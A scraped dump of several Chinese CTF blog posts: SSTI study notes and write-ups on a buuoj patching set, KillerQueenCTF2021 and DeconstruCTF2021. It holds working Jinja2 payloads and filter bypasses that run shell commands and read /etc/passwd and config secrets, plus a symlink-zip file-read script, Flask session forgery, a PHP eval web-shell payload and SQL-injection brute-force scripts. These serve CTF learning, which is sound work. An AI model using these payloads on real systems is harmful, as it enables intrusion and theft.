__subclasses__：以列表形式返回类的所有存活子类的引用（而非实例）；python中的类都继承自object，只要调用object类对象的__subclasses__()方法就可以获取想要的子类 __init__：类的初始化方法 __globals__：对包含函数全局变量的字典的引用，可以进一步获取file, os等模块 __builtin__\u0026amp;\u0026amp;__builtins__：返回不用导入模块可以直接运行一些函数，例如int()，list()等内建函数，查看的方法是dir(__builtins__)　在py2中__builtins__模块是解释器自动创建的对于__builtin__模块的引用，并非__buitin__本身（在主模块中时，情况类似我们创建一个变量并对它做一次引用传递，两者是一样的，指向相同；当不是主模块 而是我们创建的一个可以被导入的模块时，__builtins__其实是对__builtin__.__dict__模块的引用） 在py3中__builtin__被命名为builtins 参考：深入理解Python中的__builtin__和__builtins__ | __builtins__ 与 __builtin__（builtins） 构造的原理 一言以蔽之：通过一个长长的调用继承链来将内建的函数或模块揪出来用\nstep1 - 找到基类object 通过字符串、字典、列表、元组和很特殊的request来获取基类object，mro和bases[0]均可（或者是base 一样的效果，不一一列举）\n\u0026#39;\u0026#39;.__class__.__mro__[2]\t# py2 \u0026#39;\u0026#39;.__class__.__mro__[1]\t# py3 {}.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] request.__class__.__mro__[1] step2 - 获得“能用的”子类 ().__class__.__base__.__subclasses__() 会以列表形式返回object基类下的所有子类，我们需要的是其中含有os, file, __builtins__模块的子类；这里给出一个脚本，可以单独寻找特定子类，也可以根据想要的模块找到对应的子类，返回索引位置\n# py2 \u0026amp; py3 subclass = \u0026#34;warnings.WarningMessage\u0026#34; module = \u0026#39;__builtins__\u0026#39; raw = ().__class__.__base__.__subclasses__() for index, value in enumerate(raw): if subclass in str(value): print(\u0026#39;[*] %s - %s\u0026#39; % (str(value), index)) try: if module in value.__init__.__globals__.keys(): print(index, value) except: pass 到这一步可以得到的\n到这一步，我们的payload已经构造好一半了（以下index均指我们需要的subclass的索引位置）\n().__class__.__base__.__subclasses__()[index] step3 - 调用相关函数进行rce py2 - file\u0026amp;os\u0026amp;linecache \u0026lt;type 'file'\u0026gt;是py2的专属，直接可以用read(), write(), readlines()进行文件读写\n().__class__.__base__.__subclasses__()[40](\u0026#39;/etc/passwd\u0026#39;).read() ().__class__.__base__.__subclasses__()[40](\u0026#39;/tmp\u0026#39;).write(\u0026#39;test\u0026#39;) os模块就不必说了，有system()可以直接rce的函数；在py2中这两个子类可以直接用\n# \u0026lt;class \u0026#39;site._Printer\u0026#39;\u0026gt;, 71 # \u0026lt;class \u0026#39;site.Quitter\u0026#39;\u0026gt;, 76 ().__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;os\u0026#39;].system(\u0026#39;whoami\u0026#39;) {{().__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;os\u0026#39;].__dict__.environ[\u0026#39;FLAG]}} 不嫌麻烦的还可以再套一层，用linecache来调用os，py2中有这两个类含有linecache模块\n# \u0026lt;class \u0026#39;warnings.WarningMessage\u0026#39;\u0026gt;, 58 # \u0026lt;class \u0026#39;warnings.catch_warnings\u0026#39;, 59 [].__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;linecache\u0026#39;].__dict__[\u0026#39;os\u0026#39;].__dict__[\u0026#39;system\u0026#39;](\u0026#39;whoami\u0026#39;) py3 - __builtins__ py3中就没这么直接，要关注的模块是__builtins__，借助它来调用内置的open()进行文件读写，用eval()将os模块引入rce\n().__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;whoami\u0026#39;)\u0026#34;) ().__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;open\u0026#39;](\u0026#39;/etc/passwd\u0026#39;,\u0026#39;r\u0026#39;).read() 或者是直接用__import__加载os模块执行命令\n().__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read() py2有个特殊的commands模块也可以直接rce\n().__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;commands\u0026#39;).getstatusoutput(\u0026#39;whoami\u0026#39;) ——————注意引用__builtins__内建模块这一方式在py2\u0026amp;py3完全通杀\n常用payload 其实上面已经列举的比较全啦，这里做一些小小的补充\nfor语句确定索引位置 前面提到过一点，我们需要的子类在python不同版本中位置并不固定（主要是py3 py2的基本固定死了），针对这个问题可以用Jinja支持的for语句来解决，submodule的名字可以用上面的脚本跑\n{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;submodule\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;filename\u0026#39;, \u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} {% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;submodule\u0026#39; %}{{c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;id\u0026#39;).read()\u0026#34;) }}{% endif %}{% endfor %} 特殊的一些对象 {{config}} {{config.items()}} {{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;ls\u0026#39;).read()}} {{get_flashed_messages.__globals__[\u0026#39;current_app\u0026#39;].config}} {{app.__init__.__globals__.sys.modules.app.app.__dict__}} {{url_for.__globals__[\u0026#39;__builtins__\u0026#39;].__import__(\u0026#39;os\u0026#39;).system(\u0026#39;ls\u0026#39;)}} {{url_for.__globals__[\u0026#39;current_app\u0026#39;].config.FLAG}} {{request.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;/etc/passwd\u0026#39;).read()}} {{request.application.__self__._get_data_for_json.__globals__[\u0026#39;json\u0026#39;].JSONEncoder.default.__globals__[\u0026#39;current_app\u0026#39;].config[\u0026#39;FLAG\u0026#39;]}} 各种各样的bypass 一般都不会只过滤一种的，综合应用\n针对关键字的过滤 以class为例，做一个字符串的拼接\n\u0026#39;cl\u0026#39;~\u0026#39;ass\u0026#39;\t# 拼接 \u0026#34;cl\u0026#34;+\u0026#34;ass\u0026#34; \u0026#39;cla\u0026#39;.join(\u0026#39;ss\u0026#39;)\t# 拼接 \u0026#39;Y2xhc3M=\u0026#39;.decode(\u0026#39;base64\u0026#39;)\t# b64 \u0026#39;\\u0063\\u006C\\u0061\\u0073\\u0073\u0026#39;\t# unicode \u0026#39;\\x63\\x6c\\x61\\x73\\x73\u0026#39;\t# hex 过滤[] []用在字典按索引取值和数组中取值，不过禁止了还是有函数可以用\n__getitem__\n().__class__.__base__.__subclasses__().__getitem__(index).__init__.__globals__.__getitem__(\u0026#39;__builtins__\u0026#39;).__getitem__(\u0026#39;eval\u0026#39;)(\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls /\u0026#34;).read()\u0026#39;) pop()\n().__class__.__base__.__subclasses__().pop(index).__init__.__globals__.pop(\u0026#39;__builtins__\u0026#39;).pop(\u0026#39;eval\u0026#39;)(\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls /\u0026#34;).read()\u0026#39;) .\n().__class__.__bases__.0.__subclasses__().index.__init__.__globals__.linecache.os.popen(\u0026#39;whoami\u0026#39;).read() 过滤. .点号用在向下不停地取值，跟[]很像\n\u0026#34;\u0026#34;.__class__ == \u0026#34;\u0026#34;[\u0026#34;__class__\u0026#34;] attr() 很强的一个flask内置filter，foo|attr(\u0026quot;bar\u0026quot;) == foo.bar\n{{()|attr(\u0026#39;__class__\u0026#39;)|attr(\u0026#39;__base__\u0026#39;)............}} 过滤' chr 先找出chr()的位置（注意跑脚本跑的是__builtins__ 这个函数是内建的），用模板语句给它赋个值，然后调用\n{% set chr=().__class__.__bases__[0].__subclasses__()[index].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}} request.args flask中存储请求参数及值的字典，可以将值先赋给它然后进行调用\n{{[].__class__.__base__.__subclasses__()[index].__init__.__globals__[request.args.arg1]}}\u0026amp;arg1=os 过滤_ request.args\n{{\u0026#39;\u0026#39;[request.args.class][request.args.base][request.args.subclasses]()[index](\u0026#39;/etc/passwd\u0026#39;).read() }}\u0026amp;class=__class__\u0026amp;base=__base__\u0026amp;subclasses=__subclasses__ 这种方式可以结合get和post，举例-\u0026gt;[CTFshow 击剑杯]通关大佬，在不同的字段处对传入参数的限制是不同的\n/edit?a=__init__\u0026amp;b=__globals__\u0026amp;c=__getitem__\u0026amp;d=os\u0026amp;e=popen\u0026amp;f=whoami\u0026amp;g=read POST: name={%25set%20r=request.args%25}\u0026amp;rank=1\u0026amp;speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}\u0026amp;time=2021年11月11日 按字符串的方式走，也可\n过滤{ {{}} == {% %} 过滤 +替代 其它姿势 短短短 利用的是Flask中的config对象，它可以存储一部分设置项的内容；config.update方法可以用来存储设置项中的变量，用法是config.update(key=value)\n这里用一个题做例子，指路-\u0026gt;[Digital Overdose 2021 Autumn CTF madlib]\n***pwn - 劫持got表getshell pwn，在学了在学了，指新建文件夹和md文档😅\n参考：Python 沙箱逃逸\nTornado Tornado也是一种模板，可以执行简单的表达式和传递变量，当参数可控时可能造成xss和rce\n内置字典对象 handler.settings 指向的是RequestHandler.application.settings\n{{handler.settings}} {{escape(handler.settings[\u0026#34;cookie\u0026#34;])}} 查看全局变量\n{{globals}} 执行代码 tornado支持三种ssti标签\n{{xxx}}\t可执行任意py代码和tornado内置对象 {%xxx%}\t下面展开说 {#xxx#}\t作为注释 内部语句不执行 {%%}中的语句收到限制，格式为{%操作名 参数%}，操作名有这些\napply、autoescape、block、comment、extends、for、from、if、import、include、module、raw、set、try、while、whitespace 其中的raw，可以执行原生py代码\n{%raw eval(\u0026#39;3-1\u0026#39;)%} extends可以接收文件路径作为参数来包含文件，如果该文件本身存在恶意的ssti payload，那将会被执行\n（栗子可参见 [QWB2021 Quals]托纳多，结合了sql注入+sql文件写入\nDjango Django是一个python的web框架，相比flask比较庞大一点点；p牛的这篇文章-\u0026gt;Python 格式化字符串漏洞（Django为例）指出了一种利用思路，通过Django默认的admin的model来获取settings对象，进而获取数据库账号密码、web加密密钥等信息\n两周之前基本总结过了，但是前两天遇到要构造的具体场景还是打不穿，于是又捋了一遍利用的思路，把笔记整理出来了\n这个故事告诉我们学东西要扎实，更扎实一点，不然会很蛋疼\n","date":"2021-11-08T20:59:28+08:00","permalink":"https://amiaaaz.github.io/2021/11/08/ssti-study-notes/","section":"posts","tags":["SSTI"],"title":"SSTI学习笔记"},{"categories":["CTF","LTS"],"contents":"buuoj新上了加固题这个分类，也就是线下awdp中fix的部分，只要将靶机中存在的漏洞修复好并通过check的检测即可拿到flag；有一说一，比单纯attack拿flag会简单很多（适合我这种沸物web\n下面的wp会先说纯修复角度，再串一下整体的知识点；因为自己水平有限，想尽可能说的清楚一些就会比较啰嗦，见谅QAQ\nEzsql FIX 200行，太典了，对传入的参数完全没有检测，是个筛子；用预处理的方式修，又可以分为两种形式\nmysql预处理 其中201行的ss指的是绑定SQL参数的类型为string，这一项必不可少而且必须与后面的参数一一对应\nPDO预处理 PDO预处理属于是通防了，能有效地应对sqli特别是堆叠注入，208行的设置项意为禁用模拟预处理\n[CISCN2021 总决赛]babypython FIX ssh连上后看下目录结构\n查看/app/y0u_found_it/y0u_found_it_main.py\n11行这不是典中典了？读mac地址就打通了，所以我们直接把SECRET_KEY改为一个又长又乱的随机字符串即可，可以使用uuid/guid生成器来生成\n————碎碎念：这里修复的时候可能看脸？我在几天前试的时候用的一模一样的方法，但是怎么都不能过check，今天试了一次就可以了，但是在写wp的时候再复盘就又不可以了……emmm 可能还是哪里的细节出了错但是我没有注意到？给我整不会了属于是\n关于本题 是个原题，还是个有了包浆的原题，参见-\u0026gt;[HCTF 2018]Hideandseek | [SWPU2019]Web3，做过的就知道这他妈真的就一模一样hhhhhhhh\n考点在于linux软链接+uuid+flask-session伪造，后者还经常单独出题，比如 [CISCN2019 华东南赛区]Web4，都快烤烂了\n考点一 · uuid\u0026amp;SECRET_KEY SECRET_KEY通过uuid+伪随机数的方式生成，这个考点可以参考 [CISCN2019 华东南赛区]Web4，其中app.py是这样写的\nuuid.getnode()会以48位二进制长度的正整数形式返回mac地址，linux下mac地址的位置在/sys/class/net/eth0/address，读出mac地址后我们也来生成一波伪随机数\n之后通过flask-session-cookie-manager一把梭即可伪造session值\n————另外，通常访问不存在目录时SECRET_KEY会出现在请求头中\n考点二 · linux软链接文件读取\u0026amp;zip压缩包 ln -s是linux中的软链接命令，我们可以制作对应文件的绝对路径的软链接来读文件；当不知道flask工作目录可以使用/proc/self/cwd来指向当前进程的目录\nln -s /proc/self/cwd/flag/flag/.jpg qwe 或者通过/proc/self/environ文件里包含进程的环境变量，可以从中获取flask的绝对路径，再制作软链接（关于/proc的更多信息可以参见-\u0026gt;/proc目录的妙用 | LFItoRCE利用总结，题-\u0026gt;[网鼎杯 2020 白虎组]PicDown\nln -s /proc/self/environ qwe 而对于目录内文件的列举也是有方法的，参见-\u0026gt;34C3 CTF Web题 extract0r Writeup\n甚至也可以写入shell，参见-\u0026gt;[深育杯 2021]Zipzip\n制作好的软链接通过zip打包\nzip -ry qwe.zip qwe 更多题目中的应用可以参见-\u0026gt;记录一道题的多种解法\n关于这个漏洞的实际应用可以参见-\u0026gt;GitLab 任意文件读取漏洞 (CVE-2016-9086) 和任意用户 token 泄露漏洞\n*ATTACK exp.py - 1 生成软链接\u0026amp;zip\u0026amp;自动上传\nimport requests import os import sys url = \u0026#39;http://0a716e50-1cf2-4cd8-a00f-b70d9987ed64.node3.buuoj.cn/upload\u0026#39; def makezip(): os.system(\u0026#39;ln -s \u0026#39;+sys.argv[1]+\u0026#39; exp\u0026#39;) # os.system(\u0026#39;zip --symlinks exp.zip exp\u0026#39;) os.system(\u0026#39;zip -ry exp.zip exp\u0026#39;) makezip() files = {\u0026#39;the_file\u0026#39;:open(\u0026#39;./exp.zip\u0026#39;, \u0026#39;rb\u0026#39;)} def exploit(): res = requests.post(url, files=files) print(res.text) exploit() os.system(\u0026#39;rm -rf exp\u0026#39;) os.system(\u0026#39;rm -rf exp.zip\u0026#39;) python3 exp.py /proc/self/environ python3 exp.py /app/y0u_found_it.ini python3 exp.py /app/y0u_found_it/y0u_found_it_main.py python3 exp.py /sys/class/net/eth0/address exp.py - 2 根据mac地址生成伪随机数\nimport uuid import random mac = \u0026#34;02:42:0a:00:cb:06\u0026#34; temp = mac.split(\u0026#39;:\u0026#39;) temp = [int(i,16) for i in temp] temp = [bin(i).replace(\u0026#39;0b\u0026#39;,\u0026#39;\u0026#39;).zfill(8) for i in temp] temp = \u0026#39;\u0026#39;.join(temp) mac = int(temp,2) random.seed(mac) result = str(random.random()*100) print(result) # 36.014406163923596 python3 flask_session_cookie_manager3.py decode -c \u0026#39;eyJ1c2VybmFtZSI6Imd1ZXN0In0.FGg0EA.rHjESo_p6RCP0eiosSFmF3xEmRc\u0026#39; python3 flask_session_cookie_manager3.py encode -s \u0026#39;36.014406163923596\u0026#39; -t \u0026#34;{u\u0026#39;username\u0026#39;: u\u0026#39;admin\u0026#39;}\u0026#34; 翻回头看源码，好家伙这里有内鬼\n返回的并不是真正的flag，而是secret.secret中的内容no flah\n67行这里会对unzip打开的文件进行检查，只要含有flag字样就会重定向至/?error=1\n————这里我感觉原题应该secret.py中的secret=直接就能读出来flag，想了好久，再绕一层flag.txt的话我是想不出来什么bypass的方法了，我倾向于是布置环境的时候没有设置这一点（\n***[CISCN2021 总决赛]easy_python 不知道是我的网络问题还是什么未知的bug……check之后就会宕机，只能重新下发靶机\n***[CISCN2021 总决赛]ezj4va https://juejin.cn/post/6997314123918737422\n还不会java 先空着TAT\n","date":"2021-11-07T08:57:29+08:00","permalink":"https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/","section":"posts","tags":["wp"],"title":"buuoj加固题 Wp"},{"categories":["CTF"],"contents":"web/Just Not My Type I really don\u0026rsquo;t think we\u0026rsquo;re compatible (Link)\n\u0026lt;?php $FLAG = \u0026#34;shhhh you don\u0026#39;t get to see this locally\u0026#34;; if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39;) { $password = $_POST[\u0026#34;password\u0026#34;]; if (strcasecmp($password, $FLAG) == 0) { echo $FLAG; } else { echo \u0026#34;That\u0026#39;s the wrong password!\u0026#34;; } } ?\u0026gt; 我们的老朋友strcasecmp()函数，它和strcmp()函数一样用于比较两个字符串，区别是后者会区分大小写；绕过方式是传入数组，这样会使两个函数无法处理而返回null\nflag{no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible}\nweb/PHat Pottomed Girls Now it\u0026rsquo;s attempt number 3 and this time with a Queen reference! (flag is in the root directory) (Link)\n\u0026lt;?php session_start(); function generateRandomString($length = 15) { $characters = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;; $charactersLength = strlen($characters); $randomString = \u0026#39;\u0026#39;; for ($i = 0; $i \u0026lt; $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } function filter($originalstring) { $notetoadd = str_replace(\u0026#34;\u0026lt;?php\u0026#34;, \u0026#34;\u0026#34;, $originalstring); $notetoadd = str_replace(\u0026#34;?\u0026gt;\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;\u0026lt;?\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;flag\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;fopen\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;fread\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;file_get_contents\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;fgets\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;cat\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;strings\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;less\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;more\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;head\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;tail\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;dd\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;cut\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;grep\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;tac\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;awk\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;sed\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;read\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;system\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); return $notetoadd; } if(isset($_POST[\u0026#34;notewrite\u0026#34;])) { $newnote = $_POST[\u0026#34;notewrite\u0026#34;]; //3rd times the charm and I\u0026#39;ve learned my lesson. Now I\u0026#39;ll make sure to filter more than once :) $notetoadd = filter($newnote); $notetoadd = filter($notetoadd); $notetoadd = filter($notetoadd); $filename = generateRandomString(); array_push($_SESSION[\u0026#34;notes\u0026#34;], \u0026#34;$filename.php\u0026#34;); file_put_contents(\u0026#34;$filename.php\u0026#34;, $notetoadd); header(\u0026#34;location:index.php\u0026#34;); } ?\u0026gt; 简单看一下流程，filter()函数会对我们post传入的notewrite参数（也就是会被写入的文件内容）进行比较严格的过滤，文件名是generateRandomString()生成的随机名字，但是不重要，它会自动拼上.php的后缀并且把名字写到session['notes']中；所以我们唯一需要处理的就是filter()函数的绕过了\n尴尬的是这个filter()跟个筛子一样……首先是没有过滤eval()，其次是str_replace()也是水的一批\npayload:\nnotewrite=%3C%3C%3C%3C%3F%3F%3F%3Fphp+%40eval%28%24_POST%5B%27wuhu%27%5D%29%3B 之后连上蚁剑即可查看根目录下的flag.php\nflag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}\nforensics/Obligatory Shark remember to wrap the flag\n看tcp流，telnet明文流量\n33a465747cb15e84a26564f57cda0988\nflag{dancingqueen}\n","date":"2021-10-30T16:39:15+08:00","permalink":"https://amiaaaz.github.io/2021/10/30/killerqueenctf2021-wp/","section":"posts","tags":["wp"],"title":"KillerQueenCTF2021 Wp"},{"categories":["CTF"],"contents":"https://ctftime.org/event/1453/tasks/\nWeb/Here\u0026rsquo;s a Flag A quick teaser to get yourself ready for the challenges to come! Just look for/at the flag and perhaps try your hand at some frontend tomfoolery?\nhttps://www.youtube.com/watch?v=dQw4w9WgXcQ 不用看了 Never Gonna Give You Up\n看style.css flag: \u0026ldquo;gvf{zh0frph_wr_ghfrqvwuxfwi}\u0026rdquo;; 但是不是最终的flag，解一下rot13 amount=23\ndsc{we0come_to_deconstructf}\n签到题也好折腾TAT\nWeb/Please Hi there! We used to work together back in our old company DEEMA. I recently had a problem with my computer and lost all the files on it. I remember creating a backup of my files on the company\u0026rsquo;s servers. I know it\u0026rsquo;s been a while, but could you please try to access those files? I would be very grateful!\n熟练抓包，Cookie中有两个参数，Admin_Access和Username，改为True和Clancy\n改浏览器标识头 User-Agent: DeemBrowser\n需要基础认证，但是这里的MagicWord稍微卡了一下\n原因是我太铸币了忘了加Basic，Authorization: Basic V2hhdCdzVGhlTWFnaWNXb3JkPw==\n加一个日期的头，Date: Thu, 1 Apr 2021 12:00:00 GMT\n换成Date: Mon, 5 Apr 2021 12:00:00 GMT\ndsc{4ll-y0u-g0tt4-d0-15-r3qu35t-n1c3ly}\nWeb/Taxi Union Problems An important package has been stolen from Mr Nagaraj by a Taxi driver. We\u0026rsquo;ve tried to ask the local taxi union about driver\u0026rsquo;s location but they are refusing provide the same.\nSince this package is required for a time sensitive matter we don\u0026rsquo;t have time to negotiate with the union.\nYour task is to obtain the location of the taxi using the given information Taxi Lisence Plate: TN-06-AP-9879\nHINT: The flag is the location of the taxi (no caps)\n输入TN-06-AP-9879'--%20回显一样，有注入，把post的内容拿去让sqlmap跑一下\npython sqlmap.py -r \u0026#34;/home/amelia/sh4r3/post.txt\u0026#34; -p lisence_plate --tables python sqlmap.py -r \u0026#34;/home/amelia/sh4r3/post.txt\u0026#34; -p lisence_plate -T taxi --columns python sqlmap.py -r \u0026#34;/home/amelia/sh4r3/post.txt\u0026#34; -p lisence_plate -T taxi --dump Ayanavaram\n*Web/Never gonna lie to you Trust me, take everything in the home page for face value. I would never lie to you.\n主页有一句Not even search engines can find it.，提示我们看/robots.txt\n转到/never_gonna_give_you_up页面，标题是Admin Page但是一片空白，抓包后看到post表单的地方被抬头给挡住了，目标地址是/never_gonna_let_you_down\n提交两个参数username和password，回显YOU LIED TO ME !!!\n————然后没然后了 我还没看完 环境就关了TAT\nWeb/Curly Fries 1 Normal fries are nice, but everything\u0026rsquo;s better with a curl in it. The flag is right in front of you.\nemmmmm 没有任何提示\n看wp以后发现这是真脑洞了，但也不能这么说，毕竟已经给出了Sweden很明显的提示，我们需要用指定的Swedish语言来访问这个网站\ncurl -i http://very.uniquename.xyz:8880/ -H \u0026#34;Accept-Language: sv-SE\u0026#34; dsc{1_l0v3_sw3d3n}\nWeb/The Gate Keeper That what you want is with the Gate keeper, but you need to cheat the Gate keeper to get it.\nNote: This challenge might require a bruteforce approach.\n还是sqli\nimport requests import string flag = \u0026#39;\u0026#39; print(flag) domain = string.ascii_lowercase + string.ascii_uppercase + string.digits + \u0026#39;_}\u0026#39; f = 0 challenge = \u0026#34;gate keeper\u0026#34; url = \u0026#34;\u0026#34; check = \u0026#34;\u0026#34; key = \u0026#34;\u0026#34; column = \u0026#34;\u0026#34; if challenge == \u0026#34;taxi union\u0026#34;: url = \u0026#39;http://extremely.uniquename.xyz:2052/\u0026#39; check = \u0026#34;TN-06-AP-9879\u0026#34; key = \u0026#39;lisence_plate\u0026#39; column = \u0026#34;location\u0026#34; elif challenge == \u0026#39;gate keeper\u0026#39;: url = \u0026#39;http://extremely.uniquename.xyz:2082/\u0026#39; check = \u0026#34;The flag for the CTF is the password you entered.(If you havent cheated that is)\u0026#34; key = \u0026#39;password\u0026#39; column = \u0026#34;password\u0026#34; print(\u0026#34;URL\u0026#34;, url) while True: for char in domain: payload = \u0026#34;\u0026#39; or {} like \u0026#39;{}%\u0026#39;; --\u0026#34;.format(column, flag + char) print(payload) r = requests.post(url, data={key: payload}) if (check in r.text): flag = flag + char print(\u0026#34;Success \u0026#34; + flag) break Web/Hungry Man There is nothing here I promise! ;)\n抓包，cookie部分有一个b64，解码后\n说实话，这个题做的时候没注意set-cookie的部分，参考wp\n这里的依据set-cookie的值设置后，会不断的产生新的md5-hash的cookie值，写一个脚本不断地设置和应用新的cookie，将这些解密后拼起来就是flag了\ndsc{91v3_m3_4_h4ndfu1_0f_c00k135}\nWeb/Curly Fries 2 Normal fries are nice, but everything\u0026rsquo;s better with a curl in it. Why do logos make things so recognizable?\n无提示，参考wp\n有点脑洞了，把User-Agent的地方设置为xbox和Linux之后，图片会消失并露出flag\ndsc{1m4g1n3_l1nux_0n_4n_xb0x}\nWeb/Curly Fries 3 Normal fries are nice, but everything\u0026rsquo;s better with a curl in it. I\u0026rsquo;m with you, every step of the way.\n直接访问提示405，post一下回显perhaps try Googling me instead?\n访问/robots.txt，404\n用wappalyzer可以看到这是一个flask应用\n参考wp\n看到第一个提示之后不够敏感，我们可以设置来源refer是google.com\ncurl -i -X POST -H \u0026#34;Referer: https://www.google.com\u0026#34; http://overly.uniquename.xyz:2095/ 回显中提示我们再设置Host\ncurl -i -X POST -H \u0026#34;Referer: https://www.google.com\u0026#34; -H\u0026#34;Host:https://dscvit.com\u0026#34; http://overly.uniquename.xyz:2095/ 回显potates and carrots are my friends, milk and Cookies will be my end，不是很明显，但是应该设置cookie=root\n之后回显JFATHER, JMOTHER, JDAUGHTER, ____?，提示把content-type改为json\n回显*{\u0026rsquo;error\u0026rsquo;: \u0026lsquo;json data missing\u0026rsquo;}*，添加一点data\ncurl -i -X POST -H \u0026#34;Referer: https://www.google.com\u0026#34; -H \u0026#34;Host: https://www.dscvit.com\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; --cookie \u0026#34;user=root\u0026#34; -d \u0026#39;{\u0026#34;foo\u0026#34;:\u0026#34;bar\u0026#34;}\u0026#39; http://overly.uniquename.xyz:2095/ 回显*{\u0026rsquo;error\u0026rsquo;: {\u0026lsquo;messi\u0026rsquo;: \u0026lsquo;required\u0026rsquo;}}，将foo改为bar，回显{\u0026rsquo;error\u0026rsquo;: {\u0026lsquo;messi\u0026rsquo;: \u0026lsquo;which club am i at?\u0026rsquo;}}*\n*不太懂为啥这就能知道把bar赋值为PSG？？？\ncurl -i -X POST -H \u0026#34;Referer: https://www.google.com\u0026#34; -H \u0026#34;Host: https://www.dscvit.com\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; --cookie \u0026#34;user=root\u0026#34; -d \u0026#39;{\u0026#34;messi\u0026#34;:\u0026#34;psg\u0026#34;}\u0026#39; http://overly.uniquename.xyz:2095/ 得到flag dsc{th15_15_w4y_t00_much_w0rk}\nWeb/Mega Mailer We recently launched a mass email sender that can work with any SMTP server, but recently we have reports of information leaks and and trolling through our service. Can you find whats wrong with it ?\n讲真，之前没接触过\n首先在自己的vps上开一个smtp的服务，用python开\npython3 -m smtpd -c DebuggingServer -n 0.0.0.0:25 然后其它信息正常填，body部分存在ssti注入，payload来自于PayloadsAllTheThings\n{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\u0026#39;id\u0026#39;).read()}} {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\u0026#39;ls -a\u0026#39;).read()}} {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\u0026#39;cat flag\u0026#39;).read()}} dsc{819_8r41n_m41L3R}\n参考：wp\n说实话，这一篇wp早就水完了，但是中间那个Never gonna lie to you的题因为没有地方复现也没搜着别的wp就一直拖着，拖到现在，还是没找到，放弃了，可惜死了，这个故事告诉我们做题复现要趁早\n","date":"2021-10-30T13:35:32+08:00","permalink":"https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/","section":"posts","tags":["wp"],"title":"DeconstruCTF2021 Wp"},{"categories":[],"contents":"写在前面 这将肯定是个长期更新的系列了……\n我对于“美化xx”总有一种痴迷的爱好，小学的时候就折腾过雨滴桌面（现在翻qq邮箱 还能找到14年的远古邮件）虽然可惜的是当时的截图没有保留下来，但印象中是很漂亮很漂亮的\n也是那个时候，开始给自己的手机刷机 为了换更好看的字体和模块（那是个海信的安卓机 很便宜 也是人生中第一部手机），害 